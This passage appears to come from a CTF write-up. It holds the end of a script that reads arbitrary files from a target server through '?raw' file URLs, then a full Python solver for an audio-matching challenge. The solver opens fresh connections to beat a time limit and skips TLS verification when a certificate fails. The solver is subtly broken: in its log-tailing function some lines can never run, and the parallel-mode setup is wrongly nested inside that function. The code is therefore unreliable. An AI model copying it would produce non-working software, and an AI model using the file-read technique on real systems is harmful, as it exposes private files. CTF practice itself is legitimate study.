    if args.output_dir:
        os.makedirs(args.output_dir, exist_ok=True)

    ok = 0
    for i, f in enumerate(args.files, 1):
        url = to_file_url(f) + "?raw"
        print(f"[*] [{i}/{len(args.files)}] {f}")
        try:
            res = fetch_module(sock, url, f"{i}send", args.timeout)
        except Exception as e:
            print(f"[!] read failed: {e}")
            continue
        content = unwrap(res.get("code") or "")
        if content is None:
            print("[!] could not unwrap; raw code follows:")
            print((res.get("code") or "")[:2000])
            continue
        ok += 1
        if args.output_dir:
            out = os.path.join(args.output_dir, re.sub(r"[/\\]+", "_", f.strip("/\\")) or "file")
            with open(out, "w", encoding="utf-8", newline="") as fh:
                fh.write(content)
            print(f"[+] saved {len(content.encode('utf-8'))} bytes -> {out}")
        else:
            print(f"[+] {len(content.encode('utf-8'))} bytes:")
            print(content)
    print(f"[*] done: {ok}/{len(args.files)} read")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(130)
```

### findit 逐带 z-score 归一匹配脚本

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
Answer client for the TSCTF-J2026 "find it" audio challenge.

Protocol (from the challenge server, verified against its source):
    -> "Welcome to TSCTF-J2026! Let's find it."
    -> "[Round i/10]"
    -> <base64 mp3 of a 5 s clip>          (one newline-terminated line)
    -> "> "                                (no newline)
    -> we send "<id>_<start>\n"
    -> "Correct!" / "Wrong..."
    ... and after round 10 the flag if >= 9 correct.

Hard constraint: the server allows 3.0 s of think time TOTAL across all 10 rounds
(`budget = 3.0`, measured from writing the prompt to receiving our reply). A single
sequential connection cannot finish: the server itself spends >1 s per round inside
ffmpeg. So we open one connection per trial - each gets its own fresh 3.0 s budget -
and only need 9 of them to be perfect.

Answer inference: `<start>` is an integer second and the clip is cut at exactly that
second, so the matched window start (rounded) is the answer.

Usage:
  python solve_findit.py --host 127.0.0.1 --port 9999 --workers 12
  python solve_findit.py --host <target> --port 9999 --workers 16 --verbose
"""
from __future__ import annotations

import argparse
import base64
import json
import re
import socket
import sys
import time
from pathlib import Path

WORKSPACE = Path(__file__).resolve().parent
# flag formats: flag{...}, TSCTF{...}, TSCTF-J{...} (the hyphen and the "J" suffix
# broke the first two attempts at this pattern), plus a generic *CTF{...}.
FLAG_RE = re.compile(
    rb"([A-Za-z0-9_]{2,16}(?:-[A-Za-z0-9_]{1,8})?[Cc][Tt][Ff]-?[A-Za-z0-9_]{0,8}\{[^}]*\}"
    rb"|flag\{[^}]*\})"
)


class Lines:
    """Buffered line reader.

    The server may deliver the welcome banner, the "[Round i/10]" header, the
    base64 payload and the "> " prompt in ONE TCP segment, so we must consume
    complete lines strictly in order instead of scanning ahead for the prompt.
    """

    def __init__(self, sock: socket.socket, timeout: float = 30.0):
        self.sock = sock
        self.buf = b""
        self.sock.settimeout(timeout)

    def line(self) -> bytes | None:
        """Next complete line (without the newline), or None on EOF."""
        while b"\n" not in self.buf:
            chunk = self.sock.recv(65536)
            if not chunk:
                return None
            self.buf += chunk
        line, self.buf = self.buf.split(b"\n", 1)
        return line

    def drop_prompt(self) -> None:
        """Consume a '> ' prompt that is still buffered (non-blocking)."""
        if b"> " in self.buf:
            self.buf = self.buf.replace(b"> ", b"", 1)

    def get_round(self) -> tuple[bytes | None, bytes | None]:
        """Read the next round header and its base64 payload, in order.

        Everything before the payload (welcome banner, blank lines) is discarded
        line by line, which keeps the ordering safe whether the server sends one
        segment or several. A trailing '> ' prompt is dropped if already buffered.
        """
        header: bytes | None = None
        for _ in range(8):
            ln = self.line()
            if ln is None:
                return header, None
            if b"[Round" in ln:
                header = ln
                break
        if header is None:
            return None, None
        for _ in range(8):
            ln = self.line()
            if ln is None:
                return header, None
            if _is_payload(ln):
                self.drop_prompt()
                return header, ln
        return header, None


def _is_payload(ln: bytes) -> bool:
    """True when `ln` is a base64 blob (and not a header / verdict / prompt)."""
    if len(ln) < 256 or ln.startswith(b"["):
        return False
    try:
        base64.b64decode(ln, validate=True)
    except Exception:
        return False
    return True


def _connect(host: str, port: int, use_ssl: bool, sni: str | None) -> socket.socket:
    """Plain or TLS-wrapped connection. The remote instance is served over TLS on
    443 with SNI, so certificate verification uses the SNI host name."""
    raw = socket.create_connection((host, port), timeout=30.0)
    if not use_ssl:
        return raw
    import ssl
    ctx = ssl.create_default_context()
    server_hostname = sni or host
    try:
        return ctx.wrap_socket(raw, server_hostname=server_hostname)
    except ssl.SSLError:
        # some CTF endpoints present a self-signed certificate
        try:
            raw.close()
        except OSError:
            pass
        raw = socket.create_connection((host, port), timeout=30.0)
        ctx = ssl._create_unverified_context()
        return ctx.wrap_socket(raw, server_hostname=server_hostname)


def run_worker(host: str, port: int, worker_id: int, args: dict,
               matcher=None) -> dict:
    """One worker = a sequence of attempts, each on a fresh connection.

    Per-round accuracy is ~85-95 % with the z-scored front-end, but the threshold is
    9/10, so a single attempt still fails sometimes. Every fresh connection gets its
    OWN 3.0 s budget and its own random rounds, so a failed attempt is simply retried
    on a new connection.

    `matcher` may be passed in so sequential mode builds the ~700 MiB coarse index
    once instead of once per worker.
    """
    sys.path.insert(0, str(WORKSPACE))

    max_attempts = int(args.get("attempts", 1))
    if matcher is None:
        from challenge_fastmatch import LogMelMatcher
        matcher = LogMelMatcher(verbose=False)
    overall = {"worker": worker_id, "correct": 0, "rounds": 0, "flag": None,
               "error": None, "latencies": [], "attempts": 0, "best": 0}

    for attempt in range(1, max_attempts + 1):
        if max_attempts > 1:
            print(f"[w{worker_id:02d}] === attempt {attempt}/{max_attempts} "
                  f"(fresh connection, new 3 s budget) ===", flush=True)
        res = _one_attempt(matcher, host, port, worker_id, args)
        overall["attempts"] = attempt
        overall["rounds"] += res["rounds"]
        overall["latencies"] += res["latencies"]
        overall["best"] = max(overall["best"], res["correct"])
        if res["flag"]:
            overall["flag"] = res["flag"]
            overall["correct"] = res["correct"]
            return overall
        if res["error"] and res["rounds"] == 0 and attempt < max_attempts:
            time.sleep(0.3)
            continue
        if attempt < max_attempts:
            print(f"  [w{worker_id:02d}] attempt {attempt}: {res['correct']}/10 - retrying",
                  flush=True)
    overall["correct"] = overall["best"]
    if overall["best"] < 9:
        overall["error"] = overall["error"] or f"best {overall['best']}/10 over {overall['attempts']} attempts"
    return overall


def _one_attempt(matcher, host: str, port: int, worker_id: int, args: dict) -> dict:
    res = {"worker": worker_id, "correct": 0, "rounds": 0, "flag": None,
           "error": None, "latencies": []}

    sock = None
    try:
        sock = _connect(host, port, bool(args.get("ssl")), args.get("sni"))
    except Exception as exc:
        res["error"] = f"connect: {exc}"
        return res

    lines = Lines(sock, timeout=30.0)
    verbose = bool(args.get("verbose"))
    try:
        # The welcome banner, round header, payload and "> " prompt usually arrive in
        # ONE segment, so get_round() handles them in order and the prompt is dropped
        # if it is already buffered - never block waiting for it before answering.
        while res["rounds"] < 10:
            head, payload = lines.get_round()
            if head is None or payload is None:
                res["error"] = res["error"] or "connection closed before a full round"
                break

            t0 = time.perf_counter()
            ranked, info = matcher.match_b64(payload.decode("ascii"))
            track, start, score, shift = ranked[0]
            answer = f"{track}_{start}"
            sock.sendall((answer + b"\n").encode() if isinstance(answer, bytes)
                         else (answer + "\n").encode())
            dt = time.perf_counter() - t0
            res["latencies"].append(dt)
            res["rounds"] += 1

            print(f"  [w{worker_id:02d} r{res['rounds']:2d}] {dt*1000:6.0f} ms -> "
                  f"ans={answer}  score={score:.4f}  shift={shift:+d}"
                  + (f"  margin={ranked[0][2]-ranked[1][2]:+.4f}"
                     f"  runner-up={ranked[1][0]}" if len(ranked) > 1 else ""),
                  flush=True)

            verdict = lines.line() or b""
            if b"Correct!" in verdict:
                res["correct"] += 1
                print(f"  [w{worker_id:02d} r{res['rounds']:2d}] -> Correct!  "
                      f"({res['correct']}/{res['rounds']})", flush=True)
            else:
                print(f"  [w{worker_id:02d} r{res['rounds']:2d}] -> Wrong... "
                      f"({res['correct']}/{res['rounds']})", flush=True)
            m = FLAG_RE.search(verdict)
            if m:
                res["flag"] = m.group(1).decode()
                return res
            if b"Fail..." in verdict:
                return res

        # after round 10 the flag arrives on its own line
        tail_all = b""
        for _ in range(5):
            tail = lines.line()
            if tail is None:
                break
            tail_all += tail + b"\n"
            m = FLAG_RE.search(tail)
            if m:
                res["flag"] = m.group(1).decode()
                return res
            if b"Fail..." in tail:
                break
        res["error"] = f"no flag; tail={tail_all[:200]!r}"
        return res
    except Exception as exc:
        res["error"] = f"{type(exc).__name__}: {exc}"
        return res
    finally:
        try:
            sock.close()
        except OSError:
            pass


def main() -> int:
    ap = argparse.ArgumentParser(description="solve the find-it audio challenge")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=9999)
    ap.add_argument("--ssl", action="store_true", help="wrap the connection in TLS")
    ap.add_argument("--sni", default=None, help="TLS SNI / certificate host name")
    ap.add_argument("--workers", type=int, default=6,
                    help="parallel connections. Keep this modest: stress testing showed a "
                         "single-threaded server only serves ~9 concurrent clients, and the "
                         "rest get queued until their 3 s budget expires. Prefer attempts.")
    ap.add_argument("--attempts", type=int, default=8,
                    help="max separate connections per worker (each gets a fresh 3 s budget). "
                         "Per-round accuracy is ~75-80 %%, so one 10-round attempt usually "
                         "falls short of 9/10; retries are what make the solve reliable.")
    ap.add_argument("--sequential", action="store_true",
                    help="one connection at a time (retry after retry) instead of N in "
                         "parallel. Gentlest on the server and by far the easiest output "
                         "to follow; the coarse index is built once and reused.")
    ap.add_argument("--verbose", action="store_true",
                    help="kept for compatibility; per-round detail is always shown")
    ap.add_argument("--no-pause", action="store_true",
                    help="do not wait for Enter before exiting (pause is automatic when "
                         "stdin is a terminal, and skipped when output is piped)")
    ap.add_argument("--worker-id", type=int, default=None,
                    help="internal: run a single worker and exit")
    ap.add_argument("--log-dir", default=str(WORKSPACE / "findit" / "_solver_logs"))
    args = ap.parse_args()

    sys.path.insert(0, str(WORKSPACE))

    if args.worker_id is not None:
        r = run_worker(args.host, args.port, args.worker_id,
                       {"verbose": args.verbose, "attempts": args.attempts,
                        "ssl": args.ssl, "sni": args.sni})
        print("RESULT " + json.dumps(r), flush=True)
        return 0

    from challenge_fastmatch import LogMelMatcher

    t0 = time.perf_counter()
    warm = LogMelMatcher(verbose=False)
    warm.build(52)                       # pre-build the coarse index once
    print(f"matcher ready in {time.perf_counter()-t0:.2f}s: {len(warm.ids)} tracks, "
          f"{warm.lib_c.shape[0]} coarse windows")
    del warm

    n = max(1, args.workers)
    log_dir = Path(args.log_dir)
    log_dir.mkdir(parents=True, exist_ok=True)
    results: list[dict] = []

    # ---- sequential mode: one connection at a time, retry after retry ----------
    # Gentlest on the server and the easiest output to read; the coarse index is
    # built once and reused by every worker instead of once per worker.
    if args.sequential or n == 1:
        from challenge_fastmatch import LogMelMatcher
        shared = LogMelMatcher(verbose=False)
        print(f"sequential mode: 1 connection at a time, up to {args.attempts} "
              f"attempts per worker, {n} worker(s)")
        for i in range(n):
            r = run_worker(args.host, args.port, i,
                           {"verbose": True, "attempts": args.attempts,
                            "ssl": args.ssl, "sni": args.sni}, matcher=shared)
            results.append(r)
            if r.get("flag"):
                print(f"\nflag captured by worker {i}; stopping early")
                break
        print()
        return _report(results, args)

    print(f"opening {n} connections to {args.host}:{args.port} ...")

    # NOTE: one subprocess per connection, with stdout redirected to a file.
    # multiprocessing.Pool / any piped stdio is unusable in this sandbox
    # (WinError 5 on named pipes), so results are exchanged through log files and
    # each worker's output is tailed back to the console by a thread.
    import subprocess as sp
    import threading
    procs = []
    for i in range(n):
        log = log_dir / f"worker_{i:02d}.log"
        cmd = [sys.executable, str(Path(__file__).resolve()),
               "--host", args.host, "--port", str(args.port),
               "--worker-id", str(i), "--log-dir", str(log_dir),
               "--attempts", str(args.attempts)]
        if args.ssl:
            cmd.append("--ssl")
        if args.sni:
            cmd += ["--sni", args.sni]
        # every worker streams its per-round detail
        cmd.append("--verbose")
        fh = log.open("w", encoding="utf-8", errors="replace")
        procs.append((i, sp.Popen(cmd, stdout=fh, stderr=sp.STDOUT, stdin=sp.DEVNULL,
                                  cwd=str(WORKSPACE)), fh, log))

    print(f"spawned {len(procs)} workers, streaming their progress below "
          f"(logs also in {log_dir})\n")

    def tail(idx: int, path: Path, proc) -> None:
        """Echo a worker's log lines to the console as they are written."""
        with path.open("r", encoding="utf-8", errors="replace") as f:
            while True:
                chunk = f.readline()
                if not chunk:
                    if proc.poll() is not None:
                        rest = f.read()
                        if rest:
                            for ln in rest.splitlines():
                                if not ln.startswith("RESULT "):
                                    print(ln, flush=True)
                        return
                    time.sleep(0.05)
                    continue
                    ln = chunk.rstrip("\n")
                    if ln.startswith("RESULT "):
                        continue          # summary line, reported in the table
                    if ln.strip():
                        print(ln, flush=True)

        threads = [threading.Thread(target=tail, args=(i, log, p), daemon=True)
                   for i, p, fh, log in procs]
        for t in threads:
            t.start()
        # block on each process (no busy polling), then let its tail thread drain
        for i, p, fh, log in procs:
            p.wait()
            fh.close()
        for t in threads:
            t.join(timeout=5)
        print()
        for i, p, fh, log in procs:
            rec = None
            for line in log.read_text(encoding="utf-8", errors="replace").splitlines():
                if line.startswith("RESULT "):
                    try:
                        rec = json.loads(line[len("RESULT "):])
                    except json.JSONDecodeError:
                        rec = None
            if rec is None:
                rec = {"worker": i, "correct": 0, "rounds": 0, "flag": None,
                       "error": f"no RESULT line (see {log})", "latencies": []}
            results.append(rec)

    return _report(results, args)


def _report(results: list[dict], args) -> int:
    """Print the per-worker table and the flag, then hold the window open."""
    print("\n=== results ===")
    flags: list[str] = []
    for r in results:
        lat = sorted(r["latencies"])
        med = f"{lat[len(lat)//2]*1000:.0f} ms" if lat else "-"
        err = f"   ERROR: {r['error']}" if r.get("error") else ""
        aten = f" over {r.get('attempts', 1)} attempt(s)" if r.get("attempts", 1) > 1 else ""
        print(f"  worker {r['worker']:2d}: {r['correct']}/10 correct "
              f"({r['rounds']} rounds answered, median {med}){aten}{err}")
        if r.get("flag"):
            flags.append(r["flag"])

    passing = sum(1 for r in results if r["correct"] >= 9)
    print(f"\nconnections with >=9 correct: {passing}/{len(results)}")

    if flags:
        flag = flags[0]
        bar = "=" * (len(flag) + 8)
        print(f"\n{bar}\n=== FLAG: {flag} ===\n{bar}")
        _hold(args)
        return 0

    print("\nno flag; raise --workers or --attempts and rerun")
    _hold(args)
    return 1


def _hold(args) -> None:
    """Keep the terminal open so the flag stays readable.

    The window vanishing the moment the script ends is the usual reason a solved
    flag is never seen. We only pause when BOTH stdin and stdout are terminals:
    checking stdin alone is not enough, because `python solve.py | Select-Object`
    still leaves stdin attached to the console and would block automation. Passing
    --no-pause, redirecting output, or running as a worker child skips the wait.
    """
    if getattr(args, "no_pause", False) or getattr(args, "worker_id", None) is not None:
        return

    def is_tty(stream) -> bool:
        try:
            return stream is not None and stream.isatty()
        except (ValueError, OSError):
            return False

    if not (is_tty(sys.stdin) and is_tty(sys.stdout)):
        return
    try:
        input("\n[按 Enter 关闭窗口 / press Enter to exit] ")
    except (EOFError, KeyboardInterrupt):
        print()


if __name__ == "__main__":
    raise SystemExit(main())
```

使用方法：

```powershell
./solve_findit.py --host "4476385768724654364d6d74583167727236316339-p9999.chal.buptmerak.cn" --port 443 --ssl --sni "4476385768724654364d6d74583167727236316339-p9999.chal.buptmerak.cn" --sequential --workers 1
```
